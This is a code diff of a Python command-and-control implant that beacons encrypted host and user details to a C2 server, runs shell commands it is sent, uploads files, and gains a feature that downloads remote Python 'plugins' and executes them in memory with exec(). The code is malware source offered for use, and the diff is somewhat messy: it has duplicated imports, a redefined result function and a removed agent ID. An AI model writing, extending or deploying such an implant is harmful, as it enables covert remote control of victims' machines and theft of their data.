@@ -1,12 +1,13 @@
 import time
 import random
-import requests
 import subprocess
 import json
 import socket
 import getpass
 import platform
 from cryptography.fernet import Fernet
+import importlib.util
+
 
 
 SERVER_URL = "http://localhost:5000"
@@ -84,7 +85,7 @@ def beacon():
     headers = {"USER-AGENT": random.choice(USER_AGENTS)}
 
     payload = get_system_info()
-    payload["id"] = AGENT_ID
+
     encrypted_payload = encrypt_data(json.dumps(payload))
 
     try:
@@ -164,25 +165,53 @@ def execute_shell(command, task_uuid):
         post_result(e.output.decode(), task_uuid)
 
 
-def download_file(url, save_as, task_uuid):
+import requests
+import importlib.util
+import sys
 
+def post_result(output, task_uuid):
+    """
+    Sends task output back to C2 server
+    """
+    import json, requests
+    data = json.dumps({"uuid": task_uuid, "output": output})
+    # Replace with your encryption if used
+    requests.post("http://localhost:5000/result", json={"data": data})
+
+def download_file(url, save_as=None, task_uuid=None):
     try:
-
         print(f"[+] Downloading {url}")
+        r = requests.get(url)
+        r.raise_for_status()
 
-        response = requests.get(url, stream=True)
+        if "/plugins" in url:
+            content = r.text.replace("\r\n", "\n")
+            module_name = url.split("/")[-1].replace(".py", "")
+            spec = importlib.util.spec_from_loader(module_name, loader=None)
+            module = importlib.util.module_from_spec(spec)
+            exec(content, module.__dict__)
+            sys.modules[module_name] = module
 
-        with open(save_as, "wb") as f:
-            for chunk in response.iter_content(chunk_size=1024):
-                f.write(chunk)
+            if hasattr(module, "run"):
+                module.run()
+                print(f"[+] Plugin '{module_name}' executed successfully")
+                # ✅ Mark task as done immediately
+                post_result(f"Plugin '{module_name}' executed", task_uuid)
+            else:
+                print(f"[!] Plugin '{module_name}' has no run() function")
+                post_result(f"Plugin '{module_name}' has no run() function", task_uuid)
 
-        post_result(f"[+] Downloaded {url} as {save_as}", task_uuid)
+        else:
+            if save_as is None:
+                save_as = url.split("/")[-1]
+            with open(save_as, "wb") as f:
+                f.write(r.content)
+            post_result(f"Downloaded file {save_as}", task_uuid)
 
     except Exception as e:
-
-        print(f"[!] Download error: {e}")
-
-        post_result(f"[!] Download error: {e}", task_uuid)
+        print(f"[!] Error downloading {url}: {e}")
+        if task_uuid:
+            post_result(f"Error: {e}", task_uuid)
 
 
 def upload_file(path_to_file, task_uuid):
